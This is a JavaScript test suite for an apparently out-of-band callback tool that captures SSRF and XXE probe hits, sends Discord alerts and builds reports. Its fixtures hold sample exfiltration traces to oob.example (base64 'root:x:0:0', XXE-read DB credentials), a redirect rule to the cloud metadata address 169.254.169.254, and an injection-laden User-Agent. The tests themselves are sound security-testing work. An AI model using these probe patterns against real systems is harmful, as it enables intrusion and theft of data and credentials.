import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, appendFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { parseInteraction, correlationIdOf } from "../lib/tag.mjs";
import { Tail } from "../lib/tail.mjs";
import { Store } from "../lib/store.mjs";
import { neutral, Discord } from "../lib/discord.mjs";

const ID = "cv7k2m9qx4hb8tn1wr6pe3yd0zfa5glsu";
const D = "oob.example";

test("subdomain tag: label in front of the id", () => {
  const it = parseInteraction({ protocol: "dns", "unique-id": ID, "full-id": `FeTcH.${ID.toUpperCase()}`, "q-type": "A", "remote-address": "192.0.2.53", timestamp: "2026-11-05T04:26:35.4Z", "raw-request": "x", "raw-response": "y" }, D);
  assert.equal(it.tag, "fetch");
  assert.equal(it.tagSource, "subdomain");
  assert.deepEqual(it.extraLabels, []);
  assert.equal(it.summary, `A fetch.${ID}.${D}`); // resolver 0x20 casing folded for display; raw keeps it
});

test("exfil labels before the tag are kept, tag is the closest label", () => {
  const it = parseInteraction({ protocol: "dns", "unique-id": ID, "full-id": `aGVsbG8.fetch.${ID}` }, D);
  assert.equal(it.tag, "fetch");
  assert.deepEqual(it.extraLabels, ["agvsbg8"]);
});

test("https path tag on a bare host", () => {
  const it = parseInteraction({ protocol: "https", "unique-id": ID, "full-id": ID, "raw-request": `GET /xff/abc?q=1 HTTP/1.1\r\nHost: ${ID}.${D}\r\n\r\n` }, D);
  assert.equal(it.tag, "xff");
  assert.equal(it.tagSource, "path");
  assert.equal(it.summary, "GET /xff/abc?q=1 HTTP/1.1");
  const withUa = parseInteraction({ protocol: "http", "unique-id": ID, "full-id": ID, "raw-request": `GET /a HTTP/1.1\r\nUser-Agent: curl/8.5.0\r\n\r\nUser-Agent: from-body` }, D);
  assert.equal(withUa.summary, "GET /a HTTP/1.1 · curl/8.5.0");
});

test("no tag: root path, file-like paths, absolute-form", () => {
  const mk = (line) => parseInteraction({ protocol: "http", "unique-id": ID, "full-id": ID, "raw-request": `${line}\r\n\r\n` }, D).tag;
  assert.equal(mk("GET / HTTP/1.1"), null);
  assert.equal(mk("GET /favicon.ico HTTP/1.1"), null);
  assert.equal(mk("GET /-bad HTTP/1.1"), null);
  assert.equal(mk(`GET http://${ID}.${D}/pdf/ HTTP/1.1`), "pdf");
});

test("correlation id is the first 20 chars of the payload label", () => {
  assert.equal(correlationIdOf(`${ID}.${D}`), ID.slice(0, 20));
});

test("discord neutralises mentions, markdown and control chars", () => {
  const out = neutral("@everyone `x` [link](http://e) <@123>\n");
  assert.ok(!/(^|[^\\])@/.test(out));
  assert.ok(!/(^|[^\\])[`[\]()<]/.test(out));
  assert.ok(!out.includes("\n"));
});

// A1: the hit that matters is never dropped
function fakeDiscord() {
  let t = Date.parse("2026-11-05T10:00:00Z");
  const posts = [], timers = [];
  const d = new Discord({ url: "x", dashboardUrl: "http://dash/", log: () => {}, now: () => t, later: (fn) => timers.push(fn) });
  d.post = (c) => posts.push(c);
  return { d, posts, tick: (ms) => { t += ms; }, fire: () => { const f = timers.splice(0); for (const fn of f) fn(); } };
}
let hid = 0;
const hit = (protocol, tag, ip = "1.2.3.4") => ({ id: ++hid, protocol, tag, remoteAddress: ip, qType: "A", summary: "GET /x HTTP/1.1", fullId: "x", uniqueId: "x" });

test("discord: DNS first, then the HTTP fetch minutes later still posts", () => {
  const { d, posts, tick, fire } = fakeDiscord();
  d.onHit(hit("dns", "ssrf"));
  tick(500); d.onHit(hit("dns", "ssrf", "8.8.8.8"));
  tick(5 * 60_000); d.onHit(hit("http", "ssrf", "5.6.7.8"));
  assert.equal(posts.length, 2);
  assert.match(posts[0], /^DNS hit on probe ssrf/);
  assert.match(posts[1], /^HTTP hit on probe ssrf after 2 DNS lookups from 5\.6\.7\.8/);
  assert.match(posts[1], /#probes\/ssrf\/hits$/);
  fire(); // the second DNS lookup was counted, not dropped
  assert.match(posts[2], /^1 DNS more on probe ssrf/);
});

test("discord: same source rolls up, a new source posts", () => {
  const { d, posts, tick } = fakeDiscord();
  d.onHit(hit("http", "hook", "5.6.7.8"));
  tick(1000); d.onHit(hit("http", "hook", "5.6.7.8"));
  tick(1000); d.onHit(hit("http", "hook", "9.9.9.9"));
  tick(1000); d.onHit(hit("http", "hook", "1.1.1.1"), { sourceSeen: true });
  assert.equal(posts.length, 2);
  assert.match(posts[1], /from a new source from 9\.9\.9\.9/);
});

test("discord: chatter never posts; a lone bare-id lookup does after the wait", () => {
  const { d, posts, fire } = fakeDiscord();
  d.onHit(hit("dns", null), { bareId: true, isChatter: () => true });
  fire();
  assert.equal(posts.length, 0);
  d.onHit(hit("dns", null), { bareId: true, isChatter: () => false });
  assert.equal(posts.length, 0, "waits for a tagged hit first");
  fire();
  assert.match(posts[0], /hit on an untagged payload/);
});

test("discord: retired probes post late hits at most every 10 minutes", () => {
  const { d, posts, tick } = fakeDiscord();
  d.onHit(hit("http", "old"), { retired: true });
  tick(60_000); d.onHit(hit("http", "old", "7.7.7.7"), { retired: true });
  tick(10 * 60_000); d.onHit(hit("dns", "old"), { retired: true });
  assert.equal(posts.length, 2);
  assert.match(posts[0], /^Late HTTP hit on retired probe old/);
});

test("discord: a quiet half hour starts a new episode", () => {
  const { d, posts, tick } = fakeDiscord();
  d.onHit(hit("dns", "p"));
  tick(31 * 60_000); d.onHit(hit("dns", "p"));
  assert.equal(posts.length, 2);
});

test("tail: backfill, resume after restart, partial lines, truncation", async () => {
  const dir = mkdtempSync(join(tmpdir(), "colluder-"));
  try {
    const f = join(dir, "i.jsonl");
    writeFileSync(f, '{"a":1}\n{"a":2}\n{"a":');
    const got = [];
    let state = null;
    const mk = () => new Tail(f, { onLine: (l) => got.push(l), getState: () => state, setState: (s) => (state = s), pollMs: 50 });
    let t = mk();
    await t.start();
    assert.deepEqual(got, ['{"a":1}', '{"a":2}']);
    appendFileSync(f, '3}\n');
    await t.read();
    assert.deepEqual(got.at(-1), '{"a":3}');
    t.stop();
    appendFileSync(f, '{"a":4}\n');
    t = mk(); // restart resumes from the stored offset
    await t.start();
    assert.deepEqual(got.slice(-2), ['{"a":3}', '{"a":4}']);
    assert.equal(got.length, 4);
    writeFileSync(f, '{"b":1}\n'); // truncated + rewritten
    await t.read();
    assert.equal(got.at(-1), '{"b":1}');
    t.stop();
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("store: dedupe, auto-probe for unknown tags, soft clear and restore", () => {
  const s = new Store(":memory:");
  const line = JSON.stringify({ protocol: "http", "unique-id": ID, "full-id": `fetch.${ID}`, "remote-address": "198.51.100.24", timestamp: "2026-11-05T04:26:35.571Z", "raw-request": "GET / HTTP/1.1\r\n\r\n", "raw-response": "HTTP/1.1 200 OK" });
  const it = parseInteraction(JSON.parse(line), D);
  const a = s.insert(line, it, "2026-11-05T04:26:35.900Z");
  assert.ok(a && a.probeCreated);
  assert.equal(s.insert(line, it, "x"), null, "same line twice is ignored");
  assert.equal(s.probe("fetch").registered, 0);
  s.plant("fetch", "api.shop.example", "callback", "2026-11-05T04:19:00Z");
  assert.equal(s.probe("fetch").registered, 1);
  assert.equal(s.probe("fetch").hits, 1);
  assert.equal(s.interaction(a.row.id).reqSha256.length, 64);
  assert.equal(s.clearAll("2026-11-05T05:00:00Z"), 1);
  assert.equal(s.recent().length, 0);
  assert.equal(s.restoreLastClear(), 1);
  assert.equal(s.recent().length, 1);
});

test("store: a probe's hits page by id, search escapes LIKE wildcards, filter by type, export", () => {
  const s = new Store(":memory:");
  const add = (n, protocol, req, ip = "192.0.2.1") => {
    const raw = { protocol, "unique-id": ID, "full-id": protocol === "dns" ? `n${n}.pg.${ID}` : ID, "q-type": "A", "remote-address": ip,
      timestamp: `2026-11-05T10:00:${String(n).padStart(2, "0")}.0Z`, "raw-request": protocol === "dns" ? "q" : `GET /pg/${req} HTTP/1.1\r\nHost: ${ID}.${D}\r\n\r\n`, "raw-response": "r" };
    s.insert(JSON.stringify(raw), parseInteraction(raw, D), "2026-11-05T10:01:00Z");
  };
  for (let n = 0; n < 7; n++) add(n, n % 2 ? "http" : "dns", n === 3 ? "a_100%25" : `x${n}`);
  const all = s.hits("pg");
  assert.equal(all.length, 7);
  const page = s.hits("pg", { limit: 3 });
  assert.equal(page.length, 3);
  const next = s.hits("pg", { before: page.at(-1).id, limit: 3 });
  assert.ok(next.every((r) => r.id < page.at(-1).id));
  assert.equal(s.hits("pg", { types: ["http"] }).length, 3);
  assert.equal(s.hits("pg", { q: "a_100%" }).length, 1, "% and _ match literally");
  assert.equal(s.hits("pg", { q: "a%" }).length, 0);
  assert.equal(s.hits("pg", { q: "n4.pg" }).length, 1, "searches the DNS name");
  assert.equal(s.hits(null).length, 0);
  const ex = [...s.exportRows("pg")];
  assert.equal(ex.length, 7);
  assert.ok(ex[0].rawRequest && ex[0].reqSha256);
});

test("store: rule history reports the deepest hop and decoy hits per version", () => {
  const s = new Store(":memory:");
  s.saveRule("lp", { mode: "redirect", status: 302, location: "http://x/", loop: 3, delayMs: 0, schemes: { http: true, https: true } }, "2026-11-05T10:00:00Z");
  const add = (n, answer) => {
    const raw = { protocol: "http", "unique-id": ID, "full-id": ID, "remote-address": "192.0.2.1", timestamp: `2026-11-05T10:00:0${n}.0Z`,
      "raw-request": `GET /lp/x?hop=${n} HTTP/1.1\r\nHost: ${ID}.${D}\r\n\r\n`, "raw-response": "r" };
    s.insert(JSON.stringify(raw), { ...parseInteraction(raw, D), answer }, "2026-11-05T10:01:00Z");
  };
  add(1, { by: "colluder", mode: "redirect", version: 1, decoy: "first" });
  add(2, { by: "colluder", mode: "redirect", version: 1, hop: 1 });
  add(3, { by: "colluder", mode: "redirect", version: 1, hop: 3 });
  const [v1] = s.ruleHistory("lp").history;
  assert.deepEqual([v1.hits, v1.maxHop, v1.decoys], [3, 3, 1]);
});

import { probeReport, code, fenced } from "../lib/report.mjs";

test("report: captured values stay inside code; timeline, exfil and self-tests are named", () => {
  const at = (s) => `2026-11-05T10:00:${String(s).padStart(2, "0")}.000000000Z`;
  const hits = [
    { id: 1, protocol: "dns", uniqueId: ID, fullId: `726f6f74.ssrf.${ID}`, qType: "A", remoteAddress: "198.51.100.53", timestamp: at(1), tag: "ssrf", rawRequest: "q", rawResponse: "a", reqSha256: "x", answer: null },
    { id: 2, protocol: "http", uniqueId: ID, fullId: ID, remoteAddress: "203.0.113.9", timestamp: at(2), tag: "ssrf",
      rawRequest: "GET /x?d=cm9vdDp4OjA6MA HTTP/1.1\r\nUser-Agent: evil ``` [click](http://e) <img src=x>\r\n\r\n", rawResponse: "HTTP/1.1 200 OK\r\n\r\n", reqSha256: "abc", answer: null },
    { id: 3, protocol: "http", uniqueId: ID, fullId: ID, remoteAddress: "203.0.113.10", timestamp: at(3), tag: "ssrf", rawRequest: "GET / HTTP/1.1\r\n\r\n", rawResponse: "", reqSha256: "def", answer: null },
  ];
  const md = probeReport({ probe: { tag: "ssrf", plantedAt: at(0), target: "api.shop.example webhook", note: "" }, hits, trigger: "POST /hook HTTP/1.1\r\n\r\nurl=```",
    enrich: () => null, domain: D, payloadId: ID, selfIps: ["203.0.113.10"], now: at(9) });
  assert.match(md, /First DNS lookup \(A\)/);
  assert.match(md, /First HTTP request from `203\.0\.113\.9`/);
  assert.match(md, /New source: HTTP request from `203\.0\.113\.10` \(this OOB box \(a self-test\)\)/);
  assert.match(md, /`726f6f74` decodes as hex to `root`/);
  assert.match(md, /decodes as base64url to `root:x:0:0`/);
  assert.match(md, /First web request \(#2\)/, "the self-test is not the headline request");
  assert.match(md, /header order and name case were normalised by interactsh/);
  // the hostile User-Agent sits inside a longer backtick fence, so it can't close the code span
  assert.match(md, /User-Agent ````evil ``` \[click\]\(http:\/\/e\) <img src=x>````/);
  assert.match(md, /````http\nPOST \/hook HTTP\/1\.1\n\nurl=```\n````/, "fence outgrows backticks in the trigger");
  // hits come in ingest order; the report reads them in time order (edge hits land before interactsh's)
  const late = probeReport({ probe: { tag: "ssrf", plantedAt: at(0), target: "", note: "" }, hits: [hits[2], hits[0], hits[1]],
    enrich: () => null, domain: D, payloadId: ID, selfIps: ["203.0.113.10"], now: at(9) });
  assert.match(late, /first 2026-11-05 10:00:01\.000, last 2026-11-05 10:00:03\.000/);
  assert.equal(code("a\nb"), "`a\\nb`");
  assert.equal(code("`x`"), "`` `x` ``");
  assert.match(fenced("x".repeat(20000)), /more bytes not included/);
});

import { edgeCodeHash, EDGE_FILES } from "../lib/codehash.mjs";
import { mkdtempSync as mkd, mkdirSync as mkdir2, writeFileSync as wf, rmSync as rmrf } from "node:fs";
import { tmpdir as tmp2 } from "node:os";
import { join as j2 } from "node:path";

test("codehash: the edge fingerprint changes when any edge file changes", () => {
  const dir = mkd(j2(tmp2(), "ch-"));
  try {
    mkdir2(j2(dir, "lib"));
    for (const f of EDGE_FILES) wf(j2(dir, f), `// ${f}\n`);
    const a = edgeCodeHash(dir);
    assert.equal(a, edgeCodeHash(dir));
    wf(j2(dir, "lib/rules.mjs"), "// changed\n");
    assert.notEqual(edgeCodeHash(dir), a);
    assert.match(edgeCodeHash(), /^[0-9a-f]{16}$/, "the real tree hashes");
  } finally { rmrf(dir, { recursive: true }); }
});

test("store: a request that isn't UTF-8 keeps its bytes, and the hash is of the bytes", async () => {
  const { createHash } = await import("node:crypto");
  const s = new Store(":memory:");
  const bytes = Buffer.concat([Buffer.from("POST / HTTP/1.1\r\n\r\n"), Buffer.from([0xff, 0x00, 0xfe])]);
  const o = { protocol: "http", "unique-id": ID, "full-id": `bin.${ID}`, "remote-address": "198.51.100.24", timestamp: "2026-11-05T04:26:35.571Z",
    "raw-request": bytes.toString("utf8"), "raw-request-b64": bytes.toString("base64"), "raw-response": "", "colluder-answer": { by: "colluder", mode: "default", version: null } };
  const a = s.insert(JSON.stringify(o), parseInteraction(o, D, { trusted: true }), "2026-11-05T04:26:35.900Z");
  const it = s.interaction(a.row.id);
  assert.equal(it.reqSha256, createHash("sha256").update(bytes).digest("hex"));
  assert.equal(it.binary, true);
  assert.equal(it.rawLength, bytes.length);
  assert.deepEqual(s.rawRequestBytes(a.row.id), bytes);
  const untrusted = parseInteraction(o, D);
  assert.equal(untrusted.rawBytes, null, "only the edge's lines carry bytes");
});

test("store: reach is per client, without self-tests or decoys; sources marked as yours count as self", () => {
  const s = new Store(":memory:");
  s.saveRule("loop", { mode: "redirect", status: 302, location: "http://169.254.169.254/", loop: 3 }, "2026-11-05T10:00:00Z");
  let n = 0;
  const hit = (ip, ua, hop, extra = {}) => {
    const o = { protocol: "http", "unique-id": ID, "full-id": `loop.${ID}`, "remote-address": ip, timestamp: `2026-11-05T10:00:0${n}.000Z`,
      "raw-request": `GET /?hop=${hop} HTTP/1.1\r\nUser-Agent: ${ua}\r\n\r\n`, "raw-response": "", "colluder-answer": { by: "colluder", mode: "redirect", version: 1, hop, ...extra } };
    s.insert(JSON.stringify(o) + n++, parseInteraction(o, D, { trusted: true }), "2026-11-05T10:00:09Z");
  };
  hit("203.0.113.1", "Wget/1.21", 1);
  hit("203.0.113.2", "curl/8.5.0", 1); hit("203.0.113.2", "curl/8.5.0", 2); hit("203.0.113.2", "curl/8.5.0", 3);
  hit("203.0.113.10", "curl/8.5.0", 4);
  hit("198.51.100.7", "Mozilla/5.0", 4);
  hit("203.0.113.3", "HeadChecker", 1, { decoy: "method" });
  s.setMine("198.51.100.7", true, "2026-11-05T10:01:00Z");
  const v = s.ruleHistory("loop", ["203.0.113.10"]).history[0];
  assert.equal(v.maxHop, 3, "the box's and your own hop 4 don't count");
  assert.deepEqual(v.clients.map((c) => [c.ip, c.maxHop]).sort(), [["203.0.113.1", 1], ["203.0.113.2", 3]]);
  assert.deepEqual(s.mine(), ["198.51.100.7"]);
});

test("report: what the edge served, the XXE file data, payloads that fired, query values with '='", () => {
  const at = (s) => `2026-11-05T11:00:${String(s).padStart(2, "0")}.000Z`;
  const web = (id, s, fullId, line, answer) => ({ id, protocol: "http", uniqueId: ID, fullId, remoteAddress: "203.0.113.9", timestamp: at(s), tag: "x1",
    rawRequest: `${line}\r\nHost: ${fullId}.${D}\r\nUser-Agent: Java/1.8\r\n\r\n`, rawResponse: "HTTP/1.1 200 OK\r\n\r\n", reqSha256: "a", answer });
  const hits = [
    web(1, 1, `kx1.x1.${ID}`, "GET /x.dtd HTTP/1.1", { by: "colluder", mode: "preset", version: 1, part: "x.dtd", tag: "x1" }),
    web(2, 2, `kx0.x1.${ID}`, "GET /d?d=DB_USER=app&DB_PASS=s3cret HTTP/1.1", { by: "colluder", mode: "preset", version: 1, tag: "x1" }),
    web(3, 3, `kx0.x1.${ID}`, "GET /d?d= HTTP/1.1", { by: "colluder", mode: "preset", version: 1, tag: "x1" }),
    web(4, 4, `x1.${ID}`, "GET /?hop=3 HTTP/1.1", { by: "colluder", mode: "redirect", version: 2, hop: 3, code: 302, to: "169.254.169.254", tag: "x1" }),
    web(5, 5, `x1.${ID}`, "GET /?t=cm9vdDp4OjA6MA== HTTP/1.1", { by: "colluder", mode: "default", version: null, tag: "x1" }),
  ];
  const md = probeReport({ probe: { tag: "x1", plantedAt: at(0), target: "", note: "" }, hits, enrich: () => null, domain: D, payloadId: ID, now: at(9) });
  assert.match(md, /Payloads that fired:\*\* XXE, DOCTYPE line \(kx1\); XXE, File data from the DTD \(kx0\)/);
  assert.match(md, /## What the edge served/);
  assert.match(md, /`2026-11-05 11:00:01\.000` served x\.dtd, to `203\.0\.113\.9`/);
  assert.match(md, /followed 2 redirects · answered 302 → 169\.254\.169\.254/);
  assert.match(md, /## File data read through XXE/);
  assert.match(md, /```\nDB_USER=app&DB_PASS=s3cret\n```/, "everything after the first d=");
  assert.match(md, /empty \(the DTD ran; the read returned nothing\)/);
  assert.match(md, /`cm9vdDp4OjA6MA==` decodes as base64url to `root:x:0:0`/, "padding kept");
});

test("store: who planted a probe and who saved each rule version (PLAN-MCP.md M2)", () => {
  const s = new Store(":memory:");
  s.plant("mine", "app.example", "callback", "2026-11-06T10:00:00Z");
  s.plant("bot", "app.example", "callback", "2026-11-06T10:00:00Z", "claude");
  assert.equal(s.probe("mine").plantedBy, "you");
  assert.equal(s.probe("bot").plantedBy, "claude");
  s.saveRule("bot", { mode: "redirect", status: 302, location: "http://x/" }, "2026-11-06T10:01:00Z", "claude");
  s.saveRule("bot", { mode: "default" }, "2026-11-06T10:02:00Z");
  const h = s.ruleHistory("bot").history;
  assert.deepEqual(h.map((v) => [v.version, v.savedBy]), [[2, "you"], [1, "claude"]]);
  // a tag a stranger's request created, then planted by Claude, is Claude's
  s.q.autoProbe.run("seen", "2026-11-06T09:00:00Z");
  assert.equal(s.probe("seen").plantedBy, "you");
  s.plant("seen", "app.example", "callback", "2026-11-06T10:03:00Z", "claude");
  assert.equal(s.probe("seen").plantedBy, "claude");
});
